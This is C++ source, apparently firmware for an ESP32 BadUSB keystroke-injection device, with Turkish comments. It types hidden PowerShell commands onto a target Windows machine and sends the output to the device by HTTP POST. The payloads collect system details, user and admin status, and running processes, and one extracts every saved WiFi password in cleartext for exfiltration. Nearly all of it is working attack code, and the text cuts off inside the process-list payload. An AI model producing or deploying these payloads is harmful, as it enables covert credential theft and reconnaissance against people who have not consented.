//  OUTPUT CAPTURE PAYLOAD'LARI
//  Bu payloadlar çıktıyı ESP32'ye HTTP POST ile gönderir.
//  Hedef bilgisayar ESP32'nin WiFi AP'ine bağlı olmalı.
//  ESP32 IP: 192.168.4.1  Port: 8080  Endpoint: POST /out
//
//  Windows: PowerShell ile Invoke-WebRequest veya curl.exe
//  Linux:   curl veya wget
//  Mac:     curl
// ─────────────────────────────────────────────────────────

// ─── Windows Output Payloads ──────────────────────────────

// Windows SysInfo → POST to ESP32
static void payload_win_sysinfo_out() {
    badusb_ensure_init();
    dispBanner("Running+Capture...", 600, BannerType::INFO);
    badusb_win_r();
    // PowerShell: sysinfo topla, ESP32'ye POST et
    badusb_type("powershell -NoP -NonI -W Hidden -C \"");
    badusb_type("$h=$env:COMPUTERNAME;$u=$env:USERNAME;");
    badusb_type("$os=(Get-WmiObject Win32_OperatingSystem).Caption;");
    badusb_type("$ip=(ipconfig|Select-String 'IPv4'|Select-Object -First 1).ToString().Split(':')[1].Trim();");
    badusb_type("$cpu=(Get-WmiObject Win32_Processor|Select-Object -First 1).Name;");
    badusb_type("$ram=[math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,1);");
    badusb_type("$body='HOST:'+$h+' USER:'+$u+' OS:'+$os+' IP:'+$ip+' CPU:'+$cpu+' RAM:'+$ram+'GB';");
    badusb_type("try{Invoke-WebRequest -Uri 'http://192.168.4.1:8080/out' -Method POST -Body $body -TimeoutSec 5}catch{}\"");
    badusb_enter();
    logPush("[BADUSB] Win SysInfo+Out sent");
    dispBannerOK("Payload sent!");
    badusb_wait_output(25000);
}

// Windows WiFi Dump → POST to ESP32
static void payload_win_wifi_dump_out() {
    badusb_ensure_init();
    dispBanner("Running+Capture...", 600, BannerType::WARN);
    badusb_win_r();
    // WiFi profillerini al, şifrelerle birlikte ESP32'ye POST et
    badusb_type("powershell -NoP -NonI -W Hidden -C \"");
    badusb_type("$out='';");
    badusb_type("(netsh wlan show profiles)|Select-String ':'|ForEach{");
    badusb_type("$p=($_ -split ':')[1].Trim();");
    badusb_type("$k=(netsh wlan show profile name=$p key=clear|");
    badusb_type("Select-String 'Key Content');");
    badusb_type("if($k){$kv=$k.ToString().Split(':')[1].Trim()}else{$kv='<none>'};");
    badusb_type("$out+=$p+':'+$kv+'|'};");
    badusb_type("try{Invoke-WebRequest -Uri 'http://192.168.4.1:8080/out' -Method POST -Body $out -TimeoutSec 5}catch{}\"");
    badusb_enter();
    logPush("[BADUSB] Win WiFiDump+Out sent");
    dispBannerOK("Payload sent!");
    badusb_wait_output(30000);
}

// Windows whoami + ipconfig → POST to ESP32
static void payload_win_whoami_out() {
    badusb_ensure_init();
    dispBanner("Running+Capture...", 600, BannerType::INFO);
    badusb_win_r();
    badusb_type("powershell -NoP -NonI -W Hidden -C \"");
    badusb_type("$w=whoami;");
    badusb_type("$g=(whoami /groups 2>&1|Select-String 'Admin');");
    badusb_type("$isAdmin=if($g){'ADMIN'}else{'user'};");
    badusb_type("$ips=(ipconfig|Select-String 'IPv4');");
    badusb_type("$body='USER:'+$w+' PRIV:'+$isAdmin+' IPS:'+($ips -join ',');");
    badusb_type("try{Invoke-WebRequest -Uri 'http://192.168.4.1:8080/out' -Method POST -Body $body -TimeoutSec 5}catch{}\"");
    badusb_enter();
    logPush("[BADUSB] Win WhoAmI+Out sent");
    dispBannerOK("Payload sent!");
    badusb_wait_output(20000);
}

// Windows process list → POST to ESP32
static void payload_win_proclist_out() {
    badusb_ensure_init();
    dispBanner("Running+Capture...", 600, BannerType::INFO);
    badusb_win_r();
    badusb_type("powershell -NoP -NonI -W Hidden -C \"");
    badusb_type("$ps=(Get-Process|Sort-Object CPU -Desc|Select-Object -First 15|");
